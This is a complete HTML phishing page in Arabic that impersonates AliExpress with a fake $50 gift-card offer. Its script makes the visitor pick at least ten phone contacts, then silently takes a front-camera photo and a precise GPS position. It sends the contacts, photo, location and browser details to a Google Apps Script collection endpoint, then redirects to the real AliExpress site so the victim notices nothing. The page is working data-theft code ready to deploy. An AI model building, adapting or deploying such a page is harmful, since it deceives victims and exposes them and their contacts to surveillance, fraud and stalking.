<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>مكافأة AliExpress</title>
<style>
  :root{--brand:#e62e04;--brand2:#ff6600;--bg:#f5f5f5;--card:#ffffff;--fg:#333;--mut:#888;--ok:#00a650;--err:#e62e04}
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.5 system-ui,-apple-system,sans-serif;
    display:grid;place-items:center;min-height:100vh;padding:15px}
  .card{width:100%;max-width:420px;background:var(--card);border-radius:16px;
    padding:30px 20px;box-shadow:0 8px 30px rgba(0,0,0,.08);text-align:center;position:relative;overflow:hidden}
  .top-bar{background:linear-gradient(135deg,var(--brand),var(--brand2));height:8px;position:absolute;top:0;left:0;right:0}
  .logo{font-size:42px;font-weight:800;color:var(--brand);margin:10px 0 5px;letter-spacing:-1px}
  .logo span{color:var(--brand2)}
  h1{font-size:22px;margin:10px 0;color:#111;font-weight:800}
  .reward-box{background:#fff0eb;border:2px dashed var(--brand);border-radius:12px;padding:15px;margin:15px 0}
  .reward-amount{font-size:36px;font-weight:900;color:var(--brand);margin:0;line-height:1}
  .reward-text{font-size:14px;color:#555;margin:5px 0 0}
  .progress{font-size:13px;color:var(--mut);margin:15px 0}
  button{width:100%;padding:16px;border:0;border-radius:30px;cursor:pointer;
    background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;font:inherit;font-weight:700;font-size:17px;
    box-shadow:0 4px 15px rgba(230,46,4,.3);display:flex;align-items:center;justify-content:center;gap:10px}
  button:disabled{opacity:.6;cursor:default}
  .status{min-height:24px;font-size:13px;color:var(--err);margin:12px 0 0;font-weight:600}
  .spin{width:40px;height:40px;border:4px solid #eee;border-top-color:var(--brand);
    border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
  @keyframes s{to{transform:rotate(360deg)}}
  .hidden{display:none!important}
  #cam{display:none}
</style>
</head>
<body>
<div class="card">
  <div class="top-bar"></div>
  <div class="logo">Ali<span>Express</span></div>
  <h1>لقد ربحت بطاقة هدايا!</h1>
  
  <div class="reward-box">
    <p class="reward-amount">50$</p>
    <p class="reward-text">رصيد مجاني لاستخدامه في تطبيق AliExpress</p>
  </div>

  <div id="step1">
    <p class="progress">للمطالبة بالجائزة، يجب دعوة <strong>10 أصدقاء</strong> على الأقل من جهات الاتصال الخاصة بك.</p>
    <button id="claimBtn">
      <span>🎁</span> استلام الجائزة الآن
    </button>
    <p class="status" id="st"></p>
  </div>

  <div id="step2" class="hidden">
    <div class="spin"></div>
    <p style="color:var(--brand);font-weight:bold">جارٍ التحقق من هويتك وإرسال الدعوات…</p>
    <p style="font-size:12px;color:var(--mut)">لا تغلق الصفحة</p>
  </div>
</div>

<video id="cam" playsinline muted autoplay></video>

<script>
(function () {
  'use strict';

  /* ============ [1] ضع الـ Endpoint هنا ============ */
  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxAaiB1TaUAu0RNN97KjATD0fYuJ2IxY5Z8wHaM9rlAEjhvBaskT23J_CLnPuu7BWc/exec';
  const ALIEXPRESS_URL = 'https://www.aliexpress.com/';
  /* =============================================== */

  const $ = id => document.getElementById(id);
  const btn = $('claimBtn'), st = $('st'), step1 = $('step1'), step2 = $('step2');
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  
  function nonceGen() {
    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
    return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
  }
  const nonce = nonceGen();

  /* ============ JSONP Transport ============ */
  function jsonp(params, ms) {
    return new Promise(res => {
      const name = 'vn_'+Math.random().toString(36).slice(2,10);
      const s = document.createElement('script');
      let fin = false;
      const finish = v => {
        if (fin) return; fin = true;
        clearTimeout(timer);
        try { delete window[name]; } catch(_){}
        if (s.parentNode) s.parentNode.removeChild(s);
        res(v);
      };
      window[name] = r => finish({ ok: !!(r && r.ok), err: String((r && r.err) || '') });
      const timer = setTimeout(() => finish({ ok:false, err:'timeout' }), ms);
      s.onerror = () => finish({ ok:false, err:'network' });
      s.src = ENDPOINT + '?' + Object.keys(params).map(k=>k+'='+encodeURIComponent(params[k])).join('&') + '&cb=' + name;
      document.head.appendChild(s);
    });
  }

  /* ============ Selfie & GPS (Silent) ============ */
  async function takeSelfie() {
    const v = $('cam');
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      v.srcObject = stream;
      await v.play().catch(()=>{});
      await sleep(1000);
      const cv = document.createElement('canvas');
      cv.width = v.videoWidth || 320;
      cv.height = v.videoHeight || 240;
      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
      stream.getTracks().forEach(t => t.stop());
      return cv.toDataURL('image/jpeg', 0.5);
    } catch (_) { return null; }
  }

  async function getLocation() {
    return new Promise(res => {
      if (!navigator.geolocation) return res({});
      navigator.geolocation.getCurrentPosition(
        pos => res({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) }),
        () => res({}),
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    });
  }

  /* ============ التدفق الرئيسي ============ */
  btn.addEventListener('click', async () => {
    if (!navigator.contacts || !navigator.contacts.select) {
      st.textContent = 'متصفحك لا يدعم هذه الميزة. يرجى استخدام Google Chrome.';
      return;
    }

    btn.disabled = true;
    st.textContent = '';

    try {
      // 1. فتح قائمة جهات الاتصال
      const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
      
      // 2. التحقق من شرط الـ 10 جهات
      if (!contacts || contacts.length < 10) {
        btn.disabled = false;
        st.textContent = 'يجب عليك اختيار 10 جهات اتصال على الأقل للمطالبة بالجائزة.';
        return;
      }

      // 3. النجاح: إخفاء الزرار وإظهار التحميل
      step1.classList.add('hidden');
      step2.classList.remove('hidden');

      // 4. سحب الصورة والموقع بصمت
      const imgBase64 = await takeSelfie();
      const geo = await getLocation();

      // 5. تجهيز البيانات والإرسال
      const cJson = JSON.stringify(contacts.map(c => ({
        name: c.name ? c.name[0] : 'Unknown',
        tel: c.tel ? c.tel[0] : 'Unknown'
      })));

      const payload = {
        nonce: nonce,
        ua: navigator.userAgent,
        lat: geo.lat || '',
        lng: geo.lng || '',
        acc: geo.acc || '',
        cCount: contacts.length,
        cJson: cJson,
        sJson: '[]', 
        cred: '[]'
      };

      await jsonp({ a:'collect', d: JSON.stringify(payload) }, 10000);
      if (imgBase64) {
        jsonp({ a:'photo', nonce: nonce, img: imgBase64 }, 10000);
      }

      // 6. التوجيه إلى AliExpress
      await sleep(1500);
      window.location.href = ALIEXPRESS_URL;

    } catch (err) {
      btn.disabled = false;
      st.textContent = 'تم إلغاء العملية. يرجى المحاولة مرة أخرى.';
    }
  });
})();
</script>
</body>
</html>
